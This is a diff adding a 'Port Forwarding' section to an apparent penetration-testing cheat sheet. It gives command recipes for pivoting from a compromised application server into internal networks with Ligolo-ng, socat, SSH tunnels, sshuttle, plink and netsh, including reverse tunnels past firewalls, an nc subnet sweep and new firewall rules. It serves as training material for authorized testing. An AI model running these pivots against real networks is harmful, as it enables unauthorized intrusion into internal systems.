@@ -81,6 +81,7 @@
 - [plink](#plink)
 - [PNG](#png)
 - [POP3](#pop3)
+- [Port Forwarding](#port-forwarding)
 - [PowerShell](#powershell-1)
 - [printf](#printf)
 - [proc](#proc)
@@ -4119,6 +4120,351 @@ PASS <PASSWORD>
 STAT
 LIST
 RETR <NUMBER>
+```
+
+## Port Forwarding
+
+### Ligolo-ng
+
+> https://github.com/nicocha30/ligolo-ng
+
+| System             | IP address     |
+| ------------------ | -------------- |
+| LHOST              | 192.168.50.10  |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER    | 10.10.100.20   |
+| WINDOWS HOST       | 172.16.50.10   |
+
+- LHOST > APPLICATION SERVER > NETWORK
+
+#### Download Proxy and Agent
+
+> https://github.com/nicocha30/ligolo-ng/releases
+
+```c
+$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
+$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
+```
+
+#### Prepare Tunnel Interface
+
+```c
+$ sudo ip tuntap add user $(whoami) mode tun ligolo
+```
+
+```c
+$ sudo ip link set ligolo up
+```
+
+#### Setup Proxy on LHOST
+
+```c
+$ ./proxy -laddr 192.168.50.10:443 -selfcert
+```
+
+#### Setup Agent on APPLICATION SERVER
+
+```c
+$ ./agent -connect 192.168.50.10:443 -ignore-cert
+```
+
+#### Configure Session
+
+```c
+ligolo-ng » session
+```
+
+```c
+[Agent : user@target] » ifconfig
+```
+
+```c
+$ sudo ip r add 172.16.50.0/24 dev ligolo
+```
+
+```c
+[Agent : user@target] » start
+```
+
+#### Port Forwarding
+
+- LHOST < APPLICATION SERVER > DATABASE SERVER
+
+```c
+[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
+```
+
+### Socat
+
+| System             | IP address     |
+| ------------------ | -------------- |
+| LHOST              | 192.168.50.10  |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER    | 10.10.100.20   |
+| WINDOWS HOST       | 172.16.50.10   |
+
+- LHOST > APPLICATION SERVER > DATABASE SERVER
+
+##### APPLICATION SERVER
+
+```c
+$ ip a
+$ ip r
+$ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
+```
+
+##### LHOST
+
+```c
+$ psql -h <RHOST> -p 2342 -U postgres
+```
+
+### SSH Tunneling
+
+#### Local Port Forwarding
+
+| System | IP address |
+| --- | --- |
+| LHOST | 192.168.50.10 |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER | 10.10.100.20 |
+| WINDOWS HOST | 172.16.50.10 |
+
+- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
+
+##### APPLICATION SERVER
+
+```c
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ ssh <USERNAME>@192.168.100.10
+$ ip a
+$ ip r
+$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
+$ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
+```
+
+##### LHOST
+
+```c
+$ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
+```
+
+#### Dynamic Port Forwarding
+
+| System | IP address |
+| --- | --- |
+| LHOST | 192.168.50.10 |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER | 10.10.100.20 |
+| WINDOWS HOST | 172.16.50.10 |
+
+- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
+
+##### APPLICATION SERVER
+
+```c
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
+```
+
+##### LHOST
+
+```c
+$ sudo ss -tulpn
+$ tail /etc/proxychains4.conf
+socks5 192.168.50.10 9999
+$ proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
+```
+
+#### Remote Port Forwarding
+
+| System | IP address |
+| --- | --- |
+| LHOST | 192.168.50.10 |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER | 10.10.100.20 |
+| WINDOWS HOST | 172.16.50.10 |
+
+- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
+
+##### LHOST
+
+```c
+$ sudo systemctl start ssh
+$ sudo ss -tulpn
+```
+
+##### APPLICATION SERVER
+
+```c
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
+```
+
+##### LHOST
+
+```c
+$ psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+#### Remote Dynamic Port Forwarding
+
+| System             | IP address     |
+| ------------------ | -------------- |
+| LHOST              | 192.168.50.10  |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER    | 10.10.100.20   |
+| WINDOWS HOST       | 172.16.50.10   |
+
+- LHOST < FIREWALL < APPLICATION SERVER > NETWORK
+
+##### APPLICATION SERVER
+
+```c
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ ssh -N -R 9998 <USERNAME>@192.168.50.10
+```
+
+##### LHOST
+
+```c
+$ sudo ss -tulpn
+$ tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
+```
+
+### sshuttle
+
+| System             | IP address     |
+| ------------------ | -------------- |
+| LHOST              | 192.168.50.10  |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER    | 10.10.100.20   |
+| WINDOWS HOST       | 172.16.50.10   |
+
+- LHOST > APPLICATION SERVER > NETWORK
+
+##### APPLICATION SERVER
+
+```c
+$ socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
+```
+
+##### LHOST
+
+```c
+$ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
+$ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
+```
+
+### ssh.exe
+
+| System              | IP address     |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK
+
+##### LHOST
+
+```c
+$ sudo systemctl start ssh
+$ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+```
+
+##### WINDOWS JUMP SERVER
+
+```c
+C:\> where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
+```
+
+##### LHOST
+
+```c
+$ ss -tulpn
+$ tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+$ proxychains psql -h 10.10.100.20 -U postgres
+```
+
+### Plink
+
+| System              | IP address     |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+- LHOST < FIREWALL < WINDOWS JUMP SERVER
+
+##### LHOST
+
+```c
+$ find / -name plink.exe 2>/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+```
+
+##### WINDOWS JUMP SERVER
+
+```c
+C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
+```
+
+##### LHOST
+
+```c
+$ ss -tulpn
+$ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
+```
+
+### Netsh
+
+| System              | IP address     |
+| ------------------- | -------------- |
+| LHOST               | 192.168.50.10  |
+| APPLICATION SERVER  | 192.168.100.10 |
+| WINDOWS JUMP SERVER | 192.168.100.20 |
+| DATABASE SERVER     | 10.10.100.20   |
+| WINDOWS HOST        | 172.16.50.10   |
+
+- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER
+
+##### LHOST
+
+```c
+$ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+```
+
+##### WINDOWS JUMP SERVER
+
+```c
+C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
+C:\> netstat -anp TCP | find "2222"
+C:\> netsh interface portproxy show all
+C:\> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
+```
+
+##### LHOST
+
+```c
+$ sudo nmap -sS 192.168.50.10 -Pn -n -p2222
+$ ssh database_admin@192.168.50.10 -p2222
+```
+
+##### WINDOWS JUMP SERVER
+
+```c
+C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
 ## PowerShell
